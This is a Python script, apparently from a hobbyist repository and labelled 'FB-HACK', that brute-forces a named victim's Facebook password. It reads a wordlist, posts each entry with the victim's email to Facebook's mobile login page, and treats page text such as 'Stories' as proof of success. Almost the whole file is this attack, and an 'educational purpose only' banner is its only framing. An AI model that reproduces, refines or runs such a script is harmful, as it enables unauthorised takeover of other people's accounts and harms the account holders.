#HAHAHAHHAHAHAHA BRO DONT COPY MY CODE 
# I TELL YOU STOP BRO
# hah STOP READING MY CODE
# BRO CREATE YOUR OWN INSTEAD OF COPY MY OWN
# if you dont stop....


#os.system("chmod +x FB-HACK.py")
import random
import time
import datetime
import sys
import os
import time
import socket
import random
import random
import requests
red = '\033[1;31m'
y= '\033[1;93m'
green = '\033[1;92m'
clear = '\033[1;0m'
bold = '\033[1;01m'
cyan = '\033[1;96m'
cy='\033[1;095m'
cya='\033[1;035m'
wh='\033[1;97m'
os.system("clear")
print(y)
os.system("figlet U-danbaiwa...")
print("×"*65)
print("×"*65)
print(green)
os.system("figlet FB-HACK...")
print(y+"×"*65)
print(cyan+"\t[+] AUTHOR: U-danbaiwa")
print("\t[+] GITHUB: www.github.com/U-danbaiwa")
print(cyan+"\t[×]"+red+" NOTE: EDUCATIONAL PURPOSE ONLY!")
print("")
print(wh+"\t\t[+] INJOIN HACKING!!!")
print("")
print(y+"×"*65)
print(green)
os.system("bash load.sh")
print(y)
print("\n")
user=input("[+] Enter Victim ID/EMAIL: "+wh)
print(y+"")
pas=input("[+] Enter Wordlist/PasswordFiles: "+wh)
print(green+"\n")
os.system("bash load.sh")
print("\n")

pas1=open(pas,"r").readlines()
for i in pas1:
	pasword=i.strip()
	data={"email":user,"pass":pasword}
	url=("https://m.facebook.com/login.php")
	nsbsb=requests.post(url,data=data)
	kahsbs=nsbsb.text
	if "Stories" in kahsbs or "Find Friends" in kahsbs or "Labarai" in kahsbs or "கதைகள்" in kahsbs or "स्टोरीज़"  in kahsbs:
		print("\n")
		#os.system("bash load.sh")
		#print("")
		print(y+"\t\t√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√")
		print(cyan+"\t\t[+] "+green+"PASSWORD FOUND: "+wh+pasword+cyan+"  [+]")
		print(y+"\t\t√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√√")
		break
	else:
		print("")
		print(cyan+"[×]"+red+" PASSWORD NOT MATCH: "+green+pasword)
print("\n\n")
